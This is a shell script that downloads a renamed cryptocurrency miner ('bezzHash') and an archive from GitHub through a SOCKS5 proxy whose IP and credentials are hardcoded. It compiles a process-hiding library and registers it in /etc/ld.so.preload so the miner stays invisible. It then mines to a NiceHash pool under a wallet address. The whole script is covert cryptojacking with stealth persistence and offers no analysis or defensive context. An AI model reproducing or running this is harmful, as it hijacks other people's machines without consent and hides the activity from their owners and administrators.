#!/bin/sh 
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
dpkg-reconfigure --frontend noninteractive tzdata 
 
apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl 
 
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
 
tar -xvzf graphics.tar.gz 
 
cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
socks5 = 66.151.209.195:1080 
socks5_username = UZc2qYdmMcxx3QzCy2krzve3 
socks5_password = tmzwjmKP2Te8DQhDG5pPG8Ki
END 
 
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
 
sleep .2 
 
echo " " 
echo " " 
 
echo "**" 
 
./graftcp/graftcp curl ifconfig.me 
 
echo " " 
echo " " 
 
echo "**" 
 
echo " " 
echo " " 
 
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
chmod +x bezzHash 
 
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
unzip magicBezzHash.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
./graftcp/graftcp ./bezzHash --url=ssl://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5@daggerhashimoto.eu-west.nicehash.com:3353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
